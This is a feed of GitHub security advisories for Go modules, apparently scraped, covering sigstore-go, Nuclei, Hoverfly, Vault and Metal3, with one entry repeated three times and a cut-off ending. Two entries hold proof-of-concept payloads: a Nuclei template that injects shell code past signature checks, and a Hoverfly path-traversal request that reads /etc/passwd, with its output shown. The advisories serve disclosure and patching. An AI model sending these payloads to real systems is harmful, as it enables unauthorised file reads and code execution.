<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-09-05T14:01:18.629Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/sigstore/sigstore-go] sigstore-go has an unbounded loop over untrusted input can lead to endless data attack]]></title>
        <id>https://github.com/advisories/GHSA-cq38-jh5f-37mq</id>
        <link href="https://github.com/advisories/GHSA-cq38-jh5f-37mq"/>
        <updated>2024-09-04T21:34:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>sigstore-go is susceptible to a denial of service attack when a verifier is provided a maliciously crafted Sigstore Bundle containing large amounts of verifiable data, in the form of signed transparency log entries, RFC 3161 timestamps, and attestation subjects. The verification of these data structures is computationally expensive. This can be used to consume excessive CPU resources, leading to a denial of service attack. TUF's security model labels this type of vulnerability an "Endless data attack," and can lead to verification failing to complete and disrupting services that rely on sigstore-go for verification.</p>
<p>The vulnerable loops are in the verification functions in the package <code>github.com/sigstore/sigstore-go/pkg/verify</code>. The first is the DSSE envelope verification loop in <code>verifyEnvelopeWithArtifact</code>, which decodes all the digests in an attestation can be found here:</p>
<p><a href="https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/signature.go#L183-L193">https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/signature.go#L183-L193</a></p>
<p>The next loop is in the <code>VerifyArtifactTransparencyLog</code> function, which verifies all the signed entries in a bundle:</p>
<p><a href="https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tlog.go#L74-L178">https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tlog.go#L74-L178</a></p>
<p>The next loop is the <code>VerifyTimestampAuthority</code> function, which verifies all the RFC 3161 timestamps in a bundle:</p>
<p><a href="https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tsa.go#L59-L68">https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tsa.go#L59-L68</a></p>
<h3 id="patches">Patches</h3>
<p>This vulnerability is addressed with sigstore-go 0.6.1, which adds hard limits to the number of verifiable data structures that can be processed in a bundle. Verification will fail if a bundle has data that exceeds these limits. The limits are:</p>
<ul>
<li>32 signed transparency log entries</li>
<li>32 RFC 3161 timestamps</li>
<li>1024 attestation subjects</li>
<li>32 digests per attestation subject</li>
</ul>
<p>These limits are intended to be high enough to accommodate the vast majority of use cases, while preventing the verification of maliciously crafted bundles that contain large amounts of verifiable data.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The best way to mitigate the risk is to upgrade to sigstore-go 0.6.1 or later. Users who are vulnerable but unable to quickly upgrade may consider adding manual bundle validation to enforce limits similar to those in the referenced patch prior to calling sigstore-go's verification functions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sigstore/sigstore-go/security/advisories/GHSA-cq38-jh5f-37mq">https://github.com/sigstore/sigstore-go/security/advisories/GHSA-cq38-jh5f-37mq</a></li>
<li><a href="https://github.com/sigstore/sigstore-go/commit/01e70e89e58226286d7977b4dba43b6be472b12c">https://github.com/sigstore/sigstore-go/commit/01e70e89e58226286d7977b4dba43b6be472b12c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45395">https://nvd.nist.gov/vuln/detail/CVE-2024-45395</a></li>
<li><a href="https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/signature.go#L183-L193">https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/signature.go#L183-L193</a></li>
<li><a href="https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tlog.go#L74-L178">https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tlog.go#L74-L178</a></li>
<li><a href="https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tsa.go#L59-L68">https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tsa.go#L59-L68</a></li>
<li><a href="https://github.com/advisories/GHSA-cq38-jh5f-37mq">https://github.com/advisories/GHSA-cq38-jh5f-37mq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cq38-jh5f-37mq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-09-04T20:18:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/projectdiscovery/nuclei] Nuclei Template Signature Verification Bypass]]></title>
        <id>https://github.com/advisories/GHSA-7h5p-mmpp-hgmm</id>
        <link href="https://github.com/advisories/GHSA-7h5p-mmpp-hgmm"/>
        <updated>2024-09-04T20:24:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A vulnerability has been identified in Nuclei's template signature verification system that could allow an attacker to bypass the signature check and possibly execute malicious code via custom code template.</p>
<h2 id="affected-component">Affected Component</h2>
<p>The vulnerability is present in the template signature verification process, specifically in the <code>signer</code> package.</p>
<h2 id="description">Description</h2>
<p>The vulnerability stems from a discrepancy between how the signature verification process and the YAML parser handle newline characters, combined with the way multiple signatures are processed. This allows an attacker to inject malicious content into a template while maintaining a valid signature for the benign part of the template.</p>
<h3 id="affected-users">Affected Users</h3>
<ol>
<li><strong>CLI Users:</strong> Those executing <strong>custom code templates</strong> from unverified sources. This includes templates authored by third parties or obtained from unverified repositories.</li>
<li><strong>SDK Users:</strong> Developers integrating Nuclei into their platforms, particularly if they permit the execution of <strong>custom code templates</strong> by end-users.</li>
</ol>
<blockquote>
<p>[!NOTE]
Code templates are disabled as default, users have to explicitly enable with <code>-code</code> option. </p>
</blockquote>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-yaml">id: example-template
info:
  name: Example Template
# Other benign content...
# digest: &lt;valid_signature_for_benign_content&gt;
# digest: &lt;another_signature&gt;\r
code:\r
  - engine:\r
      - sh\r
      - bash\r
    source: |\r
      id\r
</code></pre>
<h3 id="patches">Patches</h3>
<ol>
<li>The vulnerability is addressed in Nuclei v3.3.2 Users are strongly recommended to update to this version to mitigate the security risk.</li>
<li>Fix reference - <a href="https://github.com/projectdiscovery/nuclei/commit/0da993afe6d41b4b1b814e8fad23a2acba13c60a">https://github.com/projectdiscovery/nuclei/commit/0da993afe6d41b4b1b814e8fad23a2acba13c60a</a></li>
</ol>
<h3 id="mitigation">Mitigation</h3>
<ul>
<li><strong>Immediate Upgrade</strong>: The primary recommendation is to upgrade to Nuclei v3.2.0, where the vulnerability has been patched.</li>
<li><strong>Avoid Unverified Templates</strong>: As an interim measure, users should refrain from using custom templates if unable to upgrade immediately. Only trusted, <a href="https://github.com/projectdiscovery/nuclei-templates">verified templates</a> should be executed.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>If you are unable to upgrade nuclei, disable running custom code templates as workaround.</p>
<h2 id="acknowledgments">Acknowledgments</h2>
<p>We would like to thank <a href="https://github.com/GuyGoldenberg">Guy Goldenberg</a> from Wiz who reported this to us via our security email, <a href="mailto:security@projectdiscovery.io">security@projectdiscovery.io</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-7h5p-mmpp-hgmm">https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-7h5p-mmpp-hgmm</a></li>
<li><a href="https://github.com/projectdiscovery/nuclei/commit/0da993afe6d41b4b1b814e8fad23a2acba13c60a">https://github.com/projectdiscovery/nuclei/commit/0da993afe6d41b4b1b814e8fad23a2acba13c60a</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43405">https://nvd.nist.gov/vuln/detail/CVE-2024-43405</a></li>
<li><a href="https://github.com/advisories/GHSA-7h5p-mmpp-hgmm">https://github.com/advisories/GHSA-7h5p-mmpp-hgmm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7h5p-mmpp-hgmm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-04T17:38:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/spectolabs/hoverfly] Hoverfly allows an arbitrary file read in the `/api/v2/simulation` endpoint (`GHSL-2023-274`)]]></title>
        <id>https://github.com/advisories/GHSA-6xx4-x46f-f897</id>
        <link href="https://github.com/advisories/GHSA-6xx4-x46f-f897"/>
        <updated>2024-09-03T21:01:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="details">Details</h3>
<p>The <code>/api/v2/simulation</code> <a href="https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/handlers/v2/simulation_handler.go#L87">POST handler</a> allows users to create new simulation views from the contents of a user-specified file. This feature can be abused by an attacker to read arbitrary files from the Hoverfly server.</p>
<pre><code class="language-go"># https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/hoverfly_funcs.go#L186
func (hf *Hoverfly) readResponseBodyFile(filePath string) (string, error) {
    if filepath.IsAbs(filePath) {
        return "", fmt.Errorf("bodyFile contains absolute path (%s). only relative is supported", filePath)
    }

    fileContents, err := ioutil.ReadFile(filepath.Join(hf.Cfg.ResponsesBodyFilesPath, filePath))
    if err != nil {
        return "", err
    }

    return string(fileContents[:]), nil
}
</code></pre>
<p>Note that, although the code prevents absolute paths from being specified, an attacker can escape out of the <code>hf.Cfg.ResponsesBodyFilesPath</code> base path by using <code>../</code> segments and reach any arbitrary files.</p>
<p>This issue was found using the <a href="https://codeql.github.com/codeql-query-help/go/go-path-injection/">Uncontrolled data used in path expression CodeQL query for python</a>.</p>
<h4 id="proof-of-concept">Proof of Concept</h4>
<p>Send the following <code>POST</code> request to read the <code>/etc/passwd</code> file:</p>
<pre><code class="language-http">POST /api/v2/simulation HTTP/1.1
Host: localhost:8888
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 128

{"data":{"pairs":[{
"request":{},"response": {
"bodyFile": "../../../../../etc/passwd"}} ]},"meta":{"schemaVersion":"v5.2"}}
</code></pre>
<p>Response will contain the Hoverfly's server <code>/etc/passwd</code></p>
<pre><code>HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Tue, 19 Dec 2023 20:59:16 GMT
Content-Length: 1494
Connection: close

{"data":{"pairs":[{"request":{},"response":{"status":0,"body":"root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\n","bodyFile":"../../../../../etc/passwd","encodedBody":false,"templated":false}}],"globalActions":{"delays":[],"delaysLogNormal":[]}},"meta":{"schemaVersion":"v5.2","hoverflyVersion":"v1.6.1","timeExported":"2023-12-19T20:59:16Z"}}
</code></pre>
<h4 id="impact">Impact</h4>
<p>This issue may lead to Information Disclosure.</p>
<h4 id="remediation">Remediation</h4>
<p>The code is <a href="https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/hoverfly_funcs.go#L186">preventing absolute paths from being read</a>. Make sure the final path (<code>filepath.Join(hf.Cfg.ResponsesBodyFilesPath, filePath)</code>) is contained within the expected base path (<code>filepath.Join(hf.Cfg.ResponsesBodyFilesPath, "/")</code>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-6xx4-x46f-f897">https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-6xx4-x46f-f897</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45388">https://nvd.nist.gov/vuln/detail/CVE-2024-45388</a></li>
<li><a href="https://codeql.github.com/codeql-query-help/go/go-path-injection">https://codeql.github.com/codeql-query-help/go/go-path-injection</a></li>
<li><a href="https://github.com/SpectoLabs/hoverfly/releases/tag/v1.10.3">https://github.com/SpectoLabs/hoverfly/releases/tag/v1.10.3</a></li>
<li><a href="https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/handlers/v2/simulation_handler.go#L87">https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/handlers/v2/simulation_handler.go#L87</a></li>
<li><a href="https://github.com/advisories/GHSA-6xx4-x46f-f897">https://github.com/advisories/GHSA-6xx4-x46f-f897</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6xx4-x46f-f897</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T21:01:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] Vault Leaks Client Token and Token Accessor in Audit Devices]]></title>
        <id>https://github.com/advisories/GHSA-jjxf-26c9-77gm</id>
        <link href="https://github.com/advisories/GHSA-jjxf-26c9-77gm"/>
        <updated>2024-09-04T17:02:28.000Z</updated>
        <content type="html"><![CDATA[<p>Vault Community Edition and Vault Enterprise experienced a regression where functionality that HMAC’d sensitive headers in the configured audit device, specifically client tokens and token accessors, was removed. This resulted in the plaintext values of client tokens and token accessors being stored in the audit log. This vulnerability, CVE-2024-8365, was fixed in Vault Community Edition and Vault Enterprise 1.17.5 and Vault Enterprise 1.16.9.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8365">https://nvd.nist.gov/vuln/detail/CVE-2024-8365</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2024-18-vault-leaks-client-token-and-token-accessor-in-audit-devices">https://discuss.hashicorp.com/t/hcsec-2024-18-vault-leaks-client-token-and-token-accessor-in-audit-devices</a></li>
<li><a href="https://github.com/advisories/GHSA-jjxf-26c9-77gm">https://github.com/advisories/GHSA-jjxf-26c9-77gm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jjxf-26c9-77gm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-02T06:30:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/metal3-io/baremetal-operator] The Bare Metal Operator (BMO) can expose particularly named secrets from other namespaces via BMH CRD]]></title>
        <id>https://github.com/advisories/GHSA-pqfh-xh7w-7h3p</id>
        <link href="https://github.com/advisories/GHSA-pqfh-xh7w-7h3p"/>
        <updated>2024-09-03T21:45:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Bare Metal Operator (BMO) implements a Kubernetes API for managing bare metal hosts in Metal3. The <code>BareMetalHost</code> (BMH) CRD allows the <code>userData</code>, <code>metaData</code>, and <code>networkData</code> for the provisioned host to be specified as links to Kubernetes Secrets. There are fields for both the <code>Name</code> and <code>Namespace</code> of the Secret, meaning that the baremetal-operator will read a <code>Secret</code> from any namespace. A user with access to create or edit a <code>BareMetalHost</code> can thus exfiltrate a <code>Secret</code> from another namespace by using it as e.g. the <code>userData</code> for provisioning some host (note that this need not be a real host, it could be a VM somewhere).</p>
<h3 id="limiting-factors">Limiting factors</h3>
<p>BMO will only read a key with the name <code>value</code> (or <code>userData</code>, <code>metaData</code>, or <code>networkData</code>), so that limits the exposure somewhat. <code>value</code> is probably a pretty common key though. Secrets used by <em>other</em> <code>BareMetalHost</code>s in different namespaces are always vulnerable.</p>
<p>It is probably relatively unusual for anyone other than cluster administrators to have RBAC access to create/edit a <code>BareMetalHost</code>. This vulnerability is only meaningful, if the cluster has users other than administrators and users' privileges are limited to their respective namespaces.</p>
<h3 id="patches">Patches</h3>
<p>The patch prevents BMO from accepting links to Secrets from other namespaces as BMH input. Any BMH configuration is only read from the same namespace only.</p>
<p>The problem is patched in BMO releases v0.8.0, v0.6.2 and v0.5.2 and users should upgrade to those versions. Prior upgrading and if needed, duplicate the BMC Secrets to the namespace where the corresponding BMH is. After upgrade, remove the old Secrets.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Operator can configure BMO RBAC to be namespace scoped for Secrets, instead of cluster scoped, to prevent BMO from accessing Secrets from other namespaces.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43803">https://nvd.nist.gov/vuln/detail/CVE-2024-43803</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1929">https://github.com/metal3-io/baremetal-operator/pull/1929</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1930">https://github.com/metal3-io/baremetal-operator/pull/1930</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1931">https://github.com/metal3-io/baremetal-operator/pull/1931</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-pqfh-xh7w-7h3p">https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-pqfh-xh7w-7h3p</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/commit/3af4882e9c5fadc1a7550f53daea21dccd271f74">https://github.com/metal3-io/baremetal-operator/commit/3af4882e9c5fadc1a7550f53daea21dccd271f74</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/commit/bedae7b997d16f36e772806681569bb8eb4dadbb">https://github.com/metal3-io/baremetal-operator/commit/bedae7b997d16f36e772806681569bb8eb4dadbb</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/commit/c2b5a557641bc273367635124047d6c958aa15f7">https://github.com/metal3-io/baremetal-operator/commit/c2b5a557641bc273367635124047d6c958aa15f7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43803">https://nvd.nist.gov/vuln/detail/CVE-2024-43803</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1929">https://github.com/metal3-io/baremetal-operator/pull/1929</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1930">https://github.com/metal3-io/baremetal-operator/pull/1930</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1931">https://github.com/metal3-io/baremetal-operator/pull/1931</a></li>
<li><a href="https://github.com/advisories/GHSA-pqfh-xh7w-7h3p">https://github.com/advisories/GHSA-pqfh-xh7w-7h3p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pqfh-xh7w-7h3p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-03T20:13:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/metal3-io/baremetal-operator] The Bare Metal Operator (BMO) can expose particularly named secrets from other namespaces via BMH CRD]]></title>
        <id>https://github.com/advisories/GHSA-pqfh-xh7w-7h3p</id>
        <link href="https://github.com/advisories/GHSA-pqfh-xh7w-7h3p"/>
        <updated>2024-09-03T21:45:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Bare Metal Operator (BMO) implements a Kubernetes API for managing bare metal hosts in Metal3. The <code>BareMetalHost</code> (BMH) CRD allows the <code>userData</code>, <code>metaData</code>, and <code>networkData</code> for the provisioned host to be specified as links to Kubernetes Secrets. There are fields for both the <code>Name</code> and <code>Namespace</code> of the Secret, meaning that the baremetal-operator will read a <code>Secret</code> from any namespace. A user with access to create or edit a <code>BareMetalHost</code> can thus exfiltrate a <code>Secret</code> from another namespace by using it as e.g. the <code>userData</code> for provisioning some host (note that this need not be a real host, it could be a VM somewhere).</p>
<h3 id="limiting-factors">Limiting factors</h3>
<p>BMO will only read a key with the name <code>value</code> (or <code>userData</code>, <code>metaData</code>, or <code>networkData</code>), so that limits the exposure somewhat. <code>value</code> is probably a pretty common key though. Secrets used by <em>other</em> <code>BareMetalHost</code>s in different namespaces are always vulnerable.</p>
<p>It is probably relatively unusual for anyone other than cluster administrators to have RBAC access to create/edit a <code>BareMetalHost</code>. This vulnerability is only meaningful, if the cluster has users other than administrators and users' privileges are limited to their respective namespaces.</p>
<h3 id="patches">Patches</h3>
<p>The patch prevents BMO from accepting links to Secrets from other namespaces as BMH input. Any BMH configuration is only read from the same namespace only.</p>
<p>The problem is patched in BMO releases v0.8.0, v0.6.2 and v0.5.2 and users should upgrade to those versions. Prior upgrading and if needed, duplicate the BMC Secrets to the namespace where the corresponding BMH is. After upgrade, remove the old Secrets.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Operator can configure BMO RBAC to be namespace scoped for Secrets, instead of cluster scoped, to prevent BMO from accessing Secrets from other namespaces.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43803">https://nvd.nist.gov/vuln/detail/CVE-2024-43803</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1929">https://github.com/metal3-io/baremetal-operator/pull/1929</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1930">https://github.com/metal3-io/baremetal-operator/pull/1930</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1931">https://github.com/metal3-io/baremetal-operator/pull/1931</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-pqfh-xh7w-7h3p">https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-pqfh-xh7w-7h3p</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/commit/3af4882e9c5fadc1a7550f53daea21dccd271f74">https://github.com/metal3-io/baremetal-operator/commit/3af4882e9c5fadc1a7550f53daea21dccd271f74</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/commit/bedae7b997d16f36e772806681569bb8eb4dadbb">https://github.com/metal3-io/baremetal-operator/commit/bedae7b997d16f36e772806681569bb8eb4dadbb</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/commit/c2b5a557641bc273367635124047d6c958aa15f7">https://github.com/metal3-io/baremetal-operator/commit/c2b5a557641bc273367635124047d6c958aa15f7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43803">https://nvd.nist.gov/vuln/detail/CVE-2024-43803</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1929">https://github.com/metal3-io/baremetal-operator/pull/1929</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1930">https://github.com/metal3-io/baremetal-operator/pull/1930</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1931">https://github.com/metal3-io/baremetal-operator/pull/1931</a></li>
<li><a href="https://github.com/advisories/GHSA-pqfh-xh7w-7h3p">https://github.com/advisories/GHSA-pqfh-xh7w-7h3p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pqfh-xh7w-7h3p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-03T20:13:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/metal3-io/baremetal-operator] The Bare Metal Operator (BMO) can expose particularly named secrets from other namespaces via BMH CRD]]></title>
        <id>https://github.com/advisories/GHSA-pqfh-xh7w-7h3p</id>
        <link href="https://github.com/advisories/GHSA-pqfh-xh7w-7h3p"/>
        <updated>2024-09-03T21:45:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Bare Metal Operator (BMO) implements a Kubernetes API for managing bare metal hosts in Metal3. The <code>BareMetalHost</code> (BMH) CRD allows the <code>userData</code>, <code>metaData</code>, and <code>networkData</code> for the provisioned host to be specified as links to Kubernetes Secrets. There are fields for both the <code>Name</code> and <code>Namespace</code> of the Secret, meaning that the baremetal-operator will read a <code>Secret</code> from any namespace. A user with access to create or edit a <code>BareMetalHost</code> can thus exfiltrate a <code>Secret</code> from another namespace by using it as e.g. the <code>userData</code> for provisioning some host (note that this need not be a real host, it could be a VM somewhere).</p>
<h3 id="limiting-factors">Limiting factors</h3>
<p>BMO will only read a key with the name <code>value</code> (or <code>userData</code>, <code>metaData</code>, or <code>networkData</code>), so that limits the exposure somewhat. <code>value</code> is probably a pretty common key though. Secrets used by <em>other</em> <code>BareMetalHost</code>s in different namespaces are always vulnerable.</p>
<p>It is probably relatively unusual for anyone other than cluster administrators to have RBAC access to create/edit a <code>BareMetalHost</code>. This vulnerability is only meaningful, if the cluster has users other than administrators and users' privileges are limited to their respective namespaces.</p>
<h3 id="patches">Patches</h3>
<p>The patch prevents BMO from accepting links to Secrets from other namespaces as BMH input. Any BMH configuration is only read from the same namespace only.</p>
<p>The problem is patched in BMO releases v0.8.0, v0.6.2 and v0.5.2 and users should upgrade to those versions. Prior upgrading and if needed, duplicate the BMC Secrets to the namespace where the corresponding BMH is. After upgrade, remove the old Secrets.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Operator can configure BMO RBAC to be namespace scoped for Secrets, instead of cluster scoped, to prevent BMO from accessing Secrets from other namespaces.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43803">https://nvd.nist.gov/vuln/detail/CVE-2024-43803</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1929">https://github.com/metal3-io/baremetal-operator/pull/1929</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1930">https://github.com/metal3-io/baremetal-operator/pull/1930</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1931">https://github.com/metal3-io/baremetal-operator/pull/1931</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-pqfh-xh7w-7h3p">https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-pqfh-xh7w-7h3p</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/commit/3af4882e9c5fadc1a7550f53daea21dccd271f74">https://github.com/metal3-io/baremetal-operator/commit/3af4882e9c5fadc1a7550f53daea21dccd271f74</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/commit/bedae7b997d16f36e772806681569bb8eb4dadbb">https://github.com/metal3-io/baremetal-operator/commit/bedae7b997d16f36e772806681569bb8eb4dadbb</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/commit/c2b5a557641bc273367635124047d6c958aa15f7">https://github.com/metal3-io/baremetal-operator/commit/c2b5a557641bc273367635124047d6c958aa15f7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43803">https://nvd.nist.gov/vuln/detail/CVE-2024-43803</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1929">https://github.com/metal3-io/baremetal-operator/pull/1929</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1930">https://github.com/metal3-io/baremetal-operator/pull/1930</a></li>
<li><a href="https://github.com/metal3-io/baremetal-operator/pull/1931">https://github.com/metal3-io/baremetal-operator/pull/1931</a></li>
<li><a href="https://github.com/advisories/GHSA-pqfh-xh7w-7h3p">https://github.com/advisories/GHSA-pqfh-xh7w-7h3p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pqfh-xh7w-7h3p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-03T20:13:25.000Z</published>
    </entry>
    <entry>
